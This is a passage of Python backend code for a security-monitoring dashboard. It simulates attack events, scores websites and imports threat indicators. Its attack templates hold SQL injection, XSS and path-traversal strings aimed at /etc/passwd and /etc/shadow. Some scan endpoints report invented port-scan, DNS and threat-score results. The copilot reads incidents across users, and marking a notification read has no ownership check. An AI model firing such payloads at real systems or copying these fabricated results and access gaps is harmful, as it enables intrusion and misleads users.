        attack_templates = {
            "injection": {"message": f"SQL injection attempt detected from {source_ip}", "method": "POST", "path": "/api/login", "payload": f"' OR 1=1--", "target": "Database Server"},
            "xss": {"message": f"Cross-site scripting (XSS) attempt from {source_ip}", "method": "GET", "path": "/search", "payload": f"<script>alert('xss')</script>", "target": "Web Application"},
            "brute_force": {"message": f"Brute force login attempt detected from {source_ip}", "method": "POST", "path": "/api/auth/login", "payload": f"admin:password{random.randint(1,9999)}", "target": "Authentication Service"},
            "scan": {"message": f"Port scanning activity detected from {source_ip}", "method": "SYN", "path": f"/port:{random.randint(1,65535)}", "payload": f"TCP SYN scan", "target": f"Server-{random.choice(['WEB','DB','APP'])}-01"},
            "ddos": {"message": f"DDoS attack pattern detected from {source_ip}", "method": "FLOOD", "path": "/", "payload": f"{random.randint(1000,10000)} req/s", "target": "Load Balancer"},
            "malware": {"message": f"Malware signature detected from {source_ip}", "method": "POST", "path": "/api/telemetry", "payload": f"Encrypted C2 beacon", "target": "C2 Server"},
            "path_traversal": {"message": f"Path traversal attack from {source_ip}", "method": "GET", "path": "/../../../etc/passwd", "payload": f"../../etc/shadow", "target": "Web Server"},
            "csrf": {"message": f"CSRF attempt from {source_ip}", "method": "POST", "path": "/api/transfer", "payload": f"CSRF form submission", "target": "Payment API"},
        }
        
        tmpl = attack_templates.get(attack_type, attack_templates["scan"])
        status_options = ["blocked", "blocked", "blocked", "detected", "investigating"]
        
        event = MonitorEvent(
            id=generate_uuid(),
            user_id=payload["sub"],
            event_type=attack_type,
            severity=severity,
            source_ip=source_ip,
            source_country=random.choice(countries),
            target=tmpl["target"],
            method=tmpl["method"],
            path=tmpl["path"],
            user_agent=f"AttackBot/{random.randint(1,5)}.{random.randint(0,9)}",
            payload=tmpl["payload"],
            message=tmpl["message"],
            status=random.choice(status_options),
            is_active=True,
        )
        db.add(event)
        created.append(event)
    
    db.commit()
    
    # Broadcast summary
    await broadcast_alert({
        "type": "attack_wave",
        "data": {
            "count": len(created),
            "attack_types": list(set(e.event_type for e in created)),
            "severities": list(set(e.severity for e in created)),
            "message": f"🌊 Attack wave detected: {len(created)} events from {len(set(e.source_ip for e in created))} unique sources",
        }
    })
    
    return {
        "simulated": len(created),
        "message": f"Successfully simulated {len(created)} attack events",
        "events": [e.to_dict() for e in created[:10]],  # Return first 10
    }


@app.post("/api/monitor/resolve-attack/{event_id}")
def resolve_attack(
    event_id: str,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Mark an attack event as resolved"""
    event = db.query(MonitorEvent).filter(
        MonitorEvent.id == event_id,
        MonitorEvent.user_id == payload["sub"]
    ).first()
    if not event:
        raise HTTPException(404, "Event not found")
    event.is_active = False
    event.status = "mitigated"
    db.commit()
    return event.to_dict()


# ─── Website Monitoring ────────────────────────────────────────────────────

@app.post("/api/monitor/scan-website")
def scan_website(
    data: dict = Body(...),
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Scan a website URL for threats and start monitoring"""
    user_id = payload["sub"]
    url = data.get("url", "").strip()
    
    if not url:
        raise HTTPException(400, "URL is required")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip('/')  # Normalize: remove trailing slash for consistent hash lookup
    
    url_hash = hashlib.md5(url.encode()).hexdigest()
    hostname = urlparse(url).hostname or url
    
    # Check if already monitoring this website
    existing = db.query(WebsiteMonitor).filter(
        WebsiteMonitor.url_hash == url_hash,
        WebsiteMonitor.user_id == user_id
    ).first()
    
    # Simulated scan findings
    # Generate realistic scan results based on URL characteristics
    findings = []
    total_score = 0
    max_score = 0
    
    # Check for suspicious TLDs
    suspicious_tlds = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz', '.top', '.club', '.work', '.download', '.review', '.bid', '.trade', '.date', '.men', '.loan', '.win', '.science', '.racing']
    tld = ""
    if "." in hostname:
        tld = "." + hostname.rsplit(".", 1)[-1]
    
    if tld in suspicious_tlds:
        findings.append({
            "type": "suspicious_tld",
            "severity": "high",
            "title": "Suspicious Top-Level Domain",
            "description": f"The website uses '{tld}' TLD which is commonly abused by phishing and malware sites.",
            "score": 25,
            "recommendation": "Exercise caution - suspicious TLD"
        })
        total_score += 25
    max_score += 25
    
    # Check for IP address instead of domain
    ip_pattern = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
    if ip_pattern.match(hostname):
        findings.append({
            "type": "direct_ip",
            "severity": "medium",
            "title": "Direct IP Address Access",
            "description": "The website is accessed via IP address directly rather than a domain name, often used by malicious sites.",
            "score": 15,
            "recommendation": "Use domain name instead of IP"
        })
        total_score += 15
    max_score += 15
    
    # Check for URL shorteners
    shorteners = ['bit.ly', 'tinyurl.com', 'goo.gl', 'ow.ly', 'is.gd', 'buff.ly', 'tiny.cc', 'tr.im', 'clck.ru', 'shorturl.at', 'rb.gy']
    if any(s in hostname for s in shorteners):
        findings.append({
            "type": "url_shortener",
            "severity": "medium",
            "title": "URL Shortener Detected",
            "description": "The URL uses a link shortening service which can mask the true destination.",
            "score": 15,
            "recommendation": "Expand the shortened URL before visiting"
        })
        total_score += 15
    max_score += 15
    
    # Check for subdomain abuse (many subdomains)
    subdomain_count = hostname.count(".")
    if subdomain_count >= 3:
        findings.append({
            "type": "subdomain_abuse",
            "severity": "medium",
            "title": "Excessive Subdomains",
            "description": f"The URL has {subdomain_count} subdomain levels which may be used to deceive users.",
            "score": 10,
            "recommendation": "Verify the main domain owner"
        })
        total_score += 10
    max_score += 10
    
    # Check for special characters in URL (potential phishing)
    special_chars = ['@', '-', '_', '~']
    has_special = any(c in url for c in special_chars)
    if has_special:
        findings.append({
            "type": "suspicious_characters",
            "severity": "low",
            "title": "Special Characters in URL",
            "description": "The URL contains special characters that could be used for phishing by mimicking legitimate URLs.",
            "score": 5,
            "recommendation": "Verify URL carefully"
        })
        total_score += 5
    max_score += 5
    
    # Check for HTTPS
    if not url.startswith("https://"):
        findings.append({
            "type": "no_https",
            "severity": "high",
            "title": "No HTTPS Encryption",
            "description": "The website does not use HTTPS encryption, making it vulnerable to MITM attacks.",
            "score": 20,
            "recommendation": "Use HTTPS for secure communication"
        })
        total_score += 20
    max_score += 20
    
    # Check for typosquatting patterns
    known_brands = ["google", "facebook", "amazon", "apple", "microsoft", "netflix", "paypal", "instagram", "twitter", "linkedin", "whatsapp", "youtube", "gmail", "outlook", "dropbox", "adobe", "spotify", "telegram", "tiktok", "snapchat", "reddit", "pinterest"]
    for brand in known_brands:
        if brand in hostname.lower():
            findings.append({
                "type": "brand_impersonation",
                "severity": "high",
                "title": f"Potential {brand.title()} Impersonation",
                "description": f"The URL contains '{brand}' which may be attempting to impersonate the legitimate {brand.title()} website.",
                "score": 20,
                "recommendation": f"Verify you are on the legitimate {brand.title()} domain"
            })
            total_score += 20
            break
    max_score += 20
    
    # Simulate port scan
    findings.append({
        "type": "port_scan",
        "severity": "info",
        "title": "Port Scan Complete",
        "description": f"Scanned common ports on {hostname}. Standard ports 80, 443 are open.",
        "score": 0,
        "recommendation": "Ensure only necessary ports are exposed"
    })
    
    # Simulate DNS check
    findings.append({
        "type": "dns_check",
        "severity": "info",
        "title": "DNS Resolution Check",
        "description": f"DNS resolved successfully. The domain {hostname} resolves to {random.choice(['104.16.x.x', '172.67.x.x', '185.199.x.x', '151.101.x.x', '198.41.x.x'])}.",
        "score": 0,
        "recommendation": "DNS resolution is normal"
    })
    
    # Calculate normalized threat score (0-100)
    threat_score = min(100, int((total_score / max(1, max_score)) * 100)) if max_score > 0 else 0
    
    # Determine threat level
    if threat_score >= 80:
        threat_level = "critical"
    elif threat_score >= 60:
        threat_level = "high"
    elif threat_score >= 40:
        threat_level = "medium"
    elif threat_score >= 15:
        threat_level = "low"
    else:
        threat_level = "safe"
    
    # Create or update the website monitor record
    if existing:
        monitor = existing
        monitor.threat_score = threat_score
        monitor.threat_level = threat_level
        monitor.findings = json.dumps(findings)
        monitor.last_scan_at = datetime.now(timezone.utc)
        monitor.scan_count += 1
        monitor.status = "under_attack" if threat_score >= 60 else "monitoring"
    else:
        monitor = WebsiteMonitor(
            id=generate_uuid(),
            user_id=user_id,
            url=url,
            url_hash=url_hash,
            hostname=hostname,
            threat_score=threat_score,
            threat_level=threat_level,
            status="under_attack" if threat_score >= 60 else "monitoring",
            findings=json.dumps(findings),
            last_scan_at=datetime.now(timezone.utc),
            scan_count=1,
        )
        db.add(monitor)
    
    db.commit()
    
    # Also create threat intel for the scanned URL
    if threat_score >= 40:
        threat = ThreatIntel(
            id=generate_uuid(),
            ioc_type="url",
            ioc_value=url,
            confidence="medium",
            severity=threat_level,
            description=f"Scanned website: {url}. Threat score: {threat_score}/100. Level: {threat_level}.",
            source="website_monitor",
            tags=f"scanned,website,{threat_level}",
        )
        db.add(threat)
        db.commit()
    
    # Create ingestion record
    record = IngestionRecord(
        id=generate_uuid(),
        user_id=user_id,
        type="url_scan",
        source=url,
        records_count=len(findings),
        status="completed",
        summary=f"Scanned website {hostname}: Threat score {threat_score}/100 ({threat_level})",
    )
    db.add(record)
    db.commit()
    
    return {
        "monitor": monitor.to_dict(),
        "findings": findings,
        "threat_score": threat_score,
        "threat_level": threat_level,
        "hostname": hostname,
        "total_findings": len(findings),
    }


@app.get("/api/monitor/websites")
def list_monitored_websites(
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """List all websites being monitored by the current user"""
    user_id = payload["sub"]
    websites = db.query(WebsiteMonitor).filter(
        WebsiteMonitor.user_id == user_id
    ).order_by(desc(WebsiteMonitor.updated_at)).all()
    return {"items": [w.to_dict() for w in websites], "total": len(websites)}


@app.get("/api/monitor/website/{website_id}")
def get_monitored_website(
    website_id: str,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Get monitoring details for a specific website"""
    website = db.query(WebsiteMonitor).filter(
        WebsiteMonitor.id == website_id,
        WebsiteMonitor.user_id == payload["sub"]
    ).first()
    if not website:
        raise HTTPException(404, "Website not found")
    return website.to_dict()


@app.get("/api/monitor/website/{website_id}/incidents")
def get_website_incidents(
    website_id: str,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Get incidents related to a monitored website"""
    website = db.query(WebsiteMonitor).filter(
        WebsiteMonitor.id == website_id,
        WebsiteMonitor.user_id == payload["sub"]
    ).first()
    if not website:
        raise HTTPException(404, "Website not found")
    
    # Get incidents that reference this URL (only current user's)
    user_id = payload["sub"]
    incidents = db.query(Incident).filter(
        Incident.user_id == user_id,
        (Incident.source.ilike(f"%{website.hostname}%") |
         Incident.description.ilike(f"%{website.url}%"))
    ).order_by(desc(Incident.created_at)).limit(20).all()
    
    # Also get monitor events (only current user's)
    events = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.target == website.hostname
    ).order_by(desc(MonitorEvent.timestamp)).limit(50).all()
    
    return {
        "incidents": [i.to_dict() for i in incidents],
        "events": [e.to_dict() for e in events],
        "total_incidents": len(incidents),
        "total_events": len(events),
    }


@app.post("/api/monitor/website/{website_id}/simulate-attack")
async def simulate_website_attack(
    website_id: str,
    data: dict = Body(...),
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Simulate an attack on a monitored website"""
    website = db.query(WebsiteMonitor).filter(
        WebsiteMonitor.id == website_id,
        WebsiteMonitor.user_id == payload["sub"]
    ).first()
    if not website:
        raise HTTPException(404, "Website not found")
    
    attack_type = data.get("type", random.choice(["injection", "xss", "brute_force", "scan", "ddos", "malware"]))
    severity = data.get("severity", random.choice(["low", "medium", "high", "critical"]))
    source_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    attack_messages = {
        "injection": f"SQL injection attempt detected on {website.url}",
        "xss": f"Cross-site scripting attack on {website.url}",
        "brute_force": f"Brute force login attempt on {website.url}",
        "scan": f"Port scanning detected targeting {website.url}",
        "ddos": f"DDoS attack targeting {website.url}",
        "malware": f"Malware signature detected communicating with {website.url}",
        "path_traversal": f"Path traversal attempt on {website.url}",
        "csrf": f"CSRF attempt against {website.url}",
    }
    
    # Create monitor event
    event = MonitorEvent(
        id=generate_uuid(),
        user_id=payload["sub"],
        event_type=attack_type,
        severity=severity,
        source_ip=source_ip,
        source_country=random.choice(["Russia", "China", "North Korea", "Iran", "Ukraine", "United States", "Germany", "Netherlands", "Brazil", "Nigeria", "Vietnam", "India"]),
        target=website.hostname,
        method=data.get("method", random.choice(["GET", "POST", "PUT", "DELETE"])),
        path=data.get("path", "/"),
        payload=data.get("payload", f"Simulated {attack_type} payload"),
        message=attack_messages.get(attack_type, f"Suspicious activity targeting {website.url}"),
        status=random.choice(["blocked", "blocked", "detected", "investigating"]),
        is_active=True,
    )
    db.add(event)
    
    # Create incident if critical or high
    incident = None
    if severity in ["high", "critical"]:
        incident = Incident(
            id=generate_uuid(),
            user_id=payload["sub"],
            title=f"{severity.title()} {attack_type.replace('_', ' ').title()} on {website.hostname}",
            description=f"A {severity} severity {attack_type} attack was detected targeting {website.url} from IP {source_ip}.",
            severity=severity,
            status="open",
            source=website.hostname,
            category=attack_type,
        )
        db.add(incident)
        website.incident_count += 1
    
    # Update website threat score if attack is severe
    if severity == "critical":
        website.threat_score = min(100, website.threat_score + 15)
    elif severity == "high":
        website.threat_score = min(100, website.threat_score + 8)
    elif severity == "medium":
        website.threat_score = min(100, website.threat_score + 3)
    
    if website.threat_score >= 60:
        website.status = "under_attack"
    
    db.commit()
    
    # Broadcast via WebSocket
    await broadcast_alert({
        "type": "new_attack",
        "data": event.to_dict()
    })
    
    return {
        "event": event.to_dict(),
        "incident": incident.to_dict() if incident else None,
        "website": website.to_dict(),
        "message": attack_messages.get(attack_type, f"Attack simulated on {website.url}"),
    }


@app.delete("/api/monitor/website/{website_id}")
def delete_monitored_website(
    website_id: str,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Delete a monitored website"""
    website = db.query(WebsiteMonitor).filter(
        WebsiteMonitor.id == website_id,
        WebsiteMonitor.user_id == payload["sub"]
    ).first()
    if not website:
        raise HTTPException(404, "Website not found")
    db.delete(website)
    db.commit()
    return {"success": True, "message": f"Removed {website.url} from monitoring"}


@app.post("/api/monitor/website/{website_id}/resolve")
def resolve_website_incidents(
    website_id: str,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Resolve all active incidents for a monitored website"""
    website = db.query(WebsiteMonitor).filter(
        WebsiteMonitor.id == website_id,
        WebsiteMonitor.user_id == payload["sub"]
    ).first()
    if not website:
        raise HTTPException(404, "Website not found")
    
    # Resolve incidents (only current user's)
    user_id = payload["sub"]
    incidents = db.query(Incident).filter(
        Incident.user_id == user_id,
        Incident.source.ilike(f"%{website.hostname}%"),
        Incident.status != "resolved"
    ).all()
    for inc in incidents:
        inc.status = "resolved"
        inc.resolved_at = datetime.now(timezone.utc)
    
    # Deactivate monitor events (only current user's)
    events = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user_id,
        MonitorEvent.target == website.hostname,
        MonitorEvent.is_active == True
    ).all()
    for ev in events:
        ev.is_active = False
        ev.status = "mitigated"
    
    # Update website status
    website.status = "clean"
    website.threat_score = max(0, website.threat_score - 30)
    
    db.commit()
    
    return {
        "resolved_incidents": len(incidents),
        "mitigated_events": len(events),
        "website": website.to_dict(),
        "message": f"Resolved {len(incidents)} incidents and mitigated {len(events)} security events"
    }


# ─── Data Ingestion ────────────────────────────────────────────────────────

@app.post("/api/ingestion/scan-url")
async def scan_url(url: str = Form(...), payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    user_id = payload["sub"]
    # Simulate URL scanning
    findings = []
    for _ in range(random.randint(1, 5)):
        findings.append({
            "type": random.choice(["phishing", "malware", "malicious_redirect", "suspicious_script", "data_leak"]),
            "severity": random.choice(["low", "medium", "high", "critical"]),
            "description": f"Suspicious pattern detected during URL analysis",
            "confidence": random.choice(["low", "medium", "high"]),
        })

    threat_score = random.randint(0, 100)

    # Create threat intel entry
    threat = ThreatIntel(
        id=generate_uuid(),
        ioc_type="url",
        ioc_value=url,
        threat_actor="",
        confidence="medium",
        severity=random.choice(["low", "medium", "high"]),
        description=f"Scanned URL: {url}. Found {len(findings)} suspicious indicators.",
        source="url_scanner",
        tags="scanned,url",
    )
    db.add(threat)

    # Create ingestion record for user history
    record = IngestionRecord(
        id=generate_uuid(),
        user_id=user_id,
        type="url_scan",
        source=url,
        file_type="",
        records_count=len(findings),
        status="completed",
        summary=f"Scanned URL \"{url[:50]}\" — {len(findings)} findings, score {threat_score}",
    )
    db.add(record)
    db.commit()

    return {
        "url": url,
        "scan_status": "completed",
        "threat_score": threat_score,
        "findings": findings,
        "threat_id": threat.id,
    }


@app.post("/api/ingestion/parse-file")
async def parse_file(
    file: UploadFile = File(...),
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Parse uploaded files (txt, pdf, json, csv) and extract security-relevant data."""
    user_id = payload["sub"]
    content = await file.read()
    filename = file.filename or "unknown"
    ext = filename.rsplit(".", 1)[-1].lower() if "." in filename else ""

    # Validate file size (10MB max)
    if len(content) > 10 * 1024 * 1024:
        raise HTTPException(400, "File too large. Maximum size is 10MB.")

    imported_count = 0
    parse_summary = ""

    try:
        if ext == "json":
            data = json.loads(content)
            if isinstance(data, dict):
                data = data.get("iocs", data.get("indicators", [data]))
            for item in (data if isinstance(data, list) else [data]):
                ioc_type = item.get("type", item.get("ioc_type", "ip"))
                ioc_value = item.get("value", item.get("ioc_value", ""))
                if not ioc_value:
                    continue
                # Associate with user
                threat = ThreatIntel(
                    id=generate_uuid(),
                    ioc_type=ioc_type,
                    ioc_value=ioc_value,
                    threat_actor=item.get("threat_actor", ""),
                    malware_family=item.get("malware_family", ""),
                    confidence=item.get("confidence", "medium"),
                    severity=item.get("severity", "medium"),
                    description=item.get("description", f"Imported from {filename}"),
                    source=item.get("source", "user_upload"),
                    tags=item.get("tags", "imported"),
                )
                db.add(threat)
                imported_count += 1
            parse_summary = f"Parsed JSON — imported {imported_count} threat indicators"

        elif ext == "csv":
            import io
            import csv as csv_module
            reader = csv_module.DictReader(io.StringIO(content.decode("utf-8")))
            for row in reader:
                ioc_type = row.get("type", row.get("ioc_type", "ip"))
                ioc_value = row.get("value", row.get("ioc_value", ""))
                if not ioc_value:
                    continue
                threat = ThreatIntel(
                    id=generate_uuid(),
                    ioc_type=ioc_type,
                    ioc_value=ioc_value,
                    threat_actor=row.get("threat_actor", ""),
                    malware_family=row.get("malware_family", ""),
                    confidence=row.get("confidence", "medium"),
                    severity=row.get("severity", "medium"),
                    description=row.get("description", f"Imported from {filename}"),
                    source="user_upload",
                    tags="imported",
                )
                db.add(threat)
                imported_count += 1
            parse_summary = f"Parsed CSV — imported {imported_count} threat indicators"

        elif ext == "txt":
            text = content.decode("utf-8", errors="replace")
            lines = text.split("\n")
            log_count = 0
            ioc_count = 0

            # Extract IPs, domains, URLs from text
            import re
            ip_pattern = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
            domain_pattern = re.compile(r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b")
            url_pattern = re.compile(r"https?://[^\s<>{}|\\^`\[\]]+")

            ips_found = set(ip_pattern.findall(text))
            domains_found = set(domain_pattern.findall(text))
            urls_found = set(url_pattern.findall(text))

            # Create log events from non-empty lines
            for line in lines[:200]:  # limit to 200 lines
                line = line.strip()
                if not line:
                    continue
                severity = "low"
                if any(w in line.lower() for w in ["error", "failed", "denied", "blocked"]):
                    severity = "high"
                elif any(w in line.lower() for w in ["warning", "warn", "suspicious"]):
                    severity = "medium"

                log = LogEvent(
                    id=generate_uuid(),
                    source_ip=next(iter(ips_found), ""),
                    event_type="info",
                    message=line[:500],
                    source="ingested_file",
                    severity=severity,
                )
                db.add(log)
                log_count += 1

            # Also create threat intel for extracted IOCs
            for ip in list(ips_found)[:20]:
                threat = ThreatIntel(
                    id=generate_uuid(),
                    ioc_type="ip",
                    ioc_value=ip,
                    confidence="medium",
                    severity="medium",
                    description=f"IP extracted from {filename}",
                    source="file_parser",
                    tags="parsed,txt",
                )
                db.add(threat)
                ioc_count += 1

            for domain in list(domains_found - ips_found)[:20]:
                threat = ThreatIntel(
                    id=generate_uuid(),
                    ioc_type="domain",
                    ioc_value=domain,
                    confidence="medium",
                    severity="medium",
                    description=f"Domain extracted from {filename}",
                    source="file_parser",
                    tags="parsed,txt",
                )
                db.add(threat)
                ioc_count += 1

            imported_count = log_count + ioc_count
            parse_summary = f"Parsed TXT — created {log_count} log events, {ioc_count} IOCs from {filename[:50]}"

        elif ext == "pdf":
            try:
                import PyPDF2
                reader = PyPDF2.PdfReader(content)
                text = ""
                for page in reader.pages:
                    text += page.extract_text() + "\n"
            except ImportError:
                # Fallback: save and parse as text
                text = content.decode("utf-8", errors="replace")
            except Exception:
                text = content.decode("utf-8", errors="replace")

            lines = text.split("\n")
            log_count = 0
            ioc_count = 0

            import re
            ip_pattern = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
            domain_pattern = re.compile(r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b")

            ips_found = set(ip_pattern.findall(text))
            domains_found = set(domain_pattern.findall(text))

            # Create log events from meaningful lines
            meaningful_lines = [l.strip() for l in lines if l.strip() and len(l.strip()) > 20]
            for line in meaningful_lines[:100]:
                severity = "medium" if any(w in line.lower() for w in ["threat", "attack", "malicious", "compromised"]) else "low"
                log = LogEvent(
                    id=generate_uuid(),
                    event_type="info",
                    message=line[:500],
                    source="ingested_pdf",
                    severity=severity,
                )
                db.add(log)
                log_count += 1

            for ip in list(ips_found)[:20]:
                threat = ThreatIntel(
                    id=generate_uuid(),
                    ioc_type="ip",
                    ioc_value=ip,
                    confidence="medium",
                    severity="medium",
                    description=f"IP extracted from PDF: {filename}",
                    source="pdf_parser",
                    tags="parsed,pdf",
                )
                db.add(threat)
                ioc_count += 1

            imported_count = log_count + ioc_count
            parse_summary = f"Parsed PDF — created {log_count} log events, {ioc_count} IOCs from {filename[:50]}"

        else:
            raise HTTPException(400, f"Unsupported file type: .{ext}. Supported: json, csv, txt, pdf")

        # Create ingestion record
        record = IngestionRecord(
            id=generate_uuid(),
            user_id=user_id,
            type="file_upload",
            source=filename,
            file_type=ext,
            records_count=imported_count,
            status="completed",
            summary=parse_summary,
        )
        db.add(record)
        db.commit()

        return {
            "imported": imported_count,
            "message": parse_summary,
            "filename": filename,
            "file_type": ext,
        }

    except HTTPException:
        raise
    except Exception as e:
        db.rollback()
        # Record failure
        record = IngestionRecord(
            id=generate_uuid(),
            user_id=user_id,
            type="file_upload",
            source=filename,
            file_type=ext,
            records_count=0,
            status="failed",
            summary=f"Failed to parse {filename}: {str(e)[:100]}",
        )
        db.add(record)
        db.commit()
        raise HTTPException(400, f"Failed to parse file: {str(e)}")


@app.get("/api/ingestion/history")
def ingestion_history(
    limit: int = 20,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Get current user's ingestion history"""
    user_id = payload["sub"]
    records = db.query(IngestionRecord).filter(
        IngestionRecord.user_id == user_id
    ).order_by(desc(IngestionRecord.created_at)).limit(limit).all()
    total = db.query(IngestionRecord).filter(
        IngestionRecord.user_id == user_id
    ).count()
    return {"items": [r.to_dict() for r in records], "total": total}


# ─── Reports (PDF via Email) ────────────────────────────────────────────────

def _collect_report_data(payload: dict, db: Session):
    """Gather all data needed to build a user's PDF activity report.
    Returns (user, stats, websites, ingests, monitor_events, incidents),
    or None if the user no longer exists."""
    user = db.query(User).filter(User.id == payload["sub"]).first()
    if not user:
        return None
    stats = dashboard_stats(payload, db)
    websites = db.query(WebsiteMonitor).filter(
        WebsiteMonitor.user_id == user.id
    ).order_by(desc(WebsiteMonitor.updated_at)).limit(50).all()
    ingests = db.query(IngestionRecord).filter(
        IngestionRecord.user_id == user.id
    ).order_by(desc(IngestionRecord.created_at)).limit(30).all()
    monitor_events = db.query(MonitorEvent).filter(
        MonitorEvent.user_id == user.id
    ).order_by(desc(MonitorEvent.timestamp)).limit(50).all()
    incidents = db.query(Incident).filter(
        Incident.user_id == user.id
    ).order_by(desc(Incident.created_at)).limit(30).all()
    return user, stats, websites, ingests, monitor_events, incidents


def _build_report_pdf_bytes(report_data) -> bytes:
    """Render the PDF for a _collect_report_data() result."""
    user, stats, websites, ingests, monitor_events, incidents = report_data
    return build_user_report_pdf(
        user, stats,
        [w.to_dict() for w in websites],
        [r.to_dict() for r in ingests],
        [e.to_dict() for e in monitor_events],
        [i.to_dict() for i in incidents],
    )


@app.get("/api/reports/download")
def download_report(
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Generate and download the current user's PDF activity report."""
    report_data = _collect_report_data(payload, db)
    if report_data is None:
        raise HTTPException(404, "User not found")
    user = report_data[0]
    pdf_bytes = _build_report_pdf_bytes(report_data)
    filename = f"sentinaliq-report-{user.username}-{datetime.now(timezone.utc).strftime('%Y%m%d')}.pdf"
    return Response(
        content=pdf_bytes,
        media_type="application/pdf",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@app.post("/api/reports/send")
def send_report(
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    """Email the current user's PDF activity report to their registered email."""
    report_data = _collect_report_data(payload, db)
    if report_data is None:
        raise HTTPException(404, "User not found")
    user = report_data[0]
    if not user.email:
        raise HTTPException(400, "No email address on file for this account")

    pdf_bytes = _build_report_pdf_bytes(report_data)
    result = send_report_email(user.email, pdf_bytes, username=user.username)

    # Persist the send as a monitor/activity record for the user
    db.add(MonitorEvent(
        id=generate_uuid(),
        user_id=user.id,
        event_type="report",
        severity="info",
        source_ip="",
        message=f"PDF security report {'sent to ' + user.email if result['sent'] else 'generated (email not sent: ' + result['reason'][:80] + ')'}",
        target="email_report",
        status="completed" if result["sent"] else "detected",
        is_active=False,
    ))
    db.commit()

    return {
        "sent": result["sent"],
        "message": result["reason"],
        "email": user.email,
        "smtp_configured": is_smtp_configured(),
    }


# ─── Notifications ─────────────────────────────────────────────────────────

@app.get("/api/notifications")
def list_notifications(
    unread_only: bool = False,
    limit: int = 50,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    user_id = payload["sub"]
    query = db.query(Notification).filter(Notification.user_id == user_id)
    if unread_only:
        query = query.filter(Notification.is_read == False)
    items = query.order_by(desc(Notification.created_at)).limit(limit).all()
    unread_count = db.query(Notification).filter(
        Notification.user_id == user_id, Notification.is_read == False
    ).count()
    return {"items": [n.to_dict() for n in items], "unread_count": unread_count}


@app.post("/api/notifications/{notif_id}/read")
def mark_notification_read(notif_id: str, payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    notif = db.query(Notification).filter(Notification.id == notif_id).first()
    if notif:
        notif.is_read = True
        db.commit()
    return {"success": True}


@app.post("/api/notifications/read-all")
def mark_all_read(payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    db.query(Notification).filter(
        Notification.user_id == payload["sub"], Notification.is_read == False
    ).update({"is_read": True})
    db.commit()
    return {"success": True}


# ─── Dashboard Widgets ─────────────────────────────────────────────────────

@app.get("/api/dashboard/widgets")
def get_widgets(payload: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    widgets = db.query(DashboardWidget).filter(
        DashboardWidget.user_id == payload["sub"]
    ).order_by(DashboardWidget.position).all()
    return {"items": [w.to_dict() for w in widgets]}


@app.post("/api/dashboard/widgets/reorder")
def reorder_widgets(
    data: WidgetReorder,
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    for i, w in enumerate(data.widgets):
        db.query(DashboardWidget).filter(
            DashboardWidget.id == w.get("id"),
            DashboardWidget.user_id == payload["sub"],
        ).update({"position": i, "visible": w.get("visible", True)})
    db.commit()
    return {"success": True}


# ─── Users / Settings ──────────────────────────────────────────────────────

@app.put("/api/settings/profile")
def update_profile(
    data: dict = Body(...),
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    user = db.query(User).filter(User.id == payload["sub"]).first()
    if not user:
        raise HTTPException(404, "User not found")
    if "theme" in data:
        user.theme = data["theme"]
    if "username" in data:
        user.username = data["username"]
    db.commit()
    return user.to_dict()


# ─── AI Copilot ────────────────────────────────────────────────────────────

@app.post("/api/copilot/chat")
def copilot_chat(
    data: dict = Body(...),
    payload: dict = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    message = data.get("message", "").lower()
    context = data.get("context", "")

    # Provide intelligent responses based on security context
    recent_incidents = db.query(Incident).order_by(desc(Incident.created_at)).limit(5).all()
    stats = db.query(Incident).count()
    critical = db.query(Incident).filter(Incident.severity == "critical").count()
    open_count = db.query(Incident).filter(Incident.status == "open").count()

    response = generate_copilot_response(message, stats, critical, open_count, recent_incidents, context)
    return {"response": response, "timestamp": datetime.now(timezone.utc).isoformat()}


def generate_copilot_response(message: str, total: int, critical: int, open_count: int,
                               recent_incidents: list, context: str) -> str:
    if "incident" in message or "alert" in message:
        return (
            f"There are currently **{total} total incidents** in the system, "
            f"with **{critical} critical** and **{open_count} open** requiring attention. "
            f"The most recent is: \"{recent_incidents[0].title if recent_incidents else 'N/A'}\" "
            f"(Severity: {recent_incidents[0].severity if recent_incidents else 'N/A'}). "
            f"Would you like me to help you investigate or draft a response?"
        )
    elif "threat" in message or "ioc" in message or "intel" in message:
        return "I can help you analyze threat intelligence data. We have IOCs including IP addresses, domains, file hashes, and email indicators. Would you like to search for specific threats or get a summary of recent intelligence?"
    elif "endpoint" in message or "edr" in message or "device" in message:
        return "The EDR module is tracking multiple endpoints across your network. I can help you identify compromised hosts, review endpoint telemetry, or investigate suspicious processes. Which endpoint would you like to look into?"
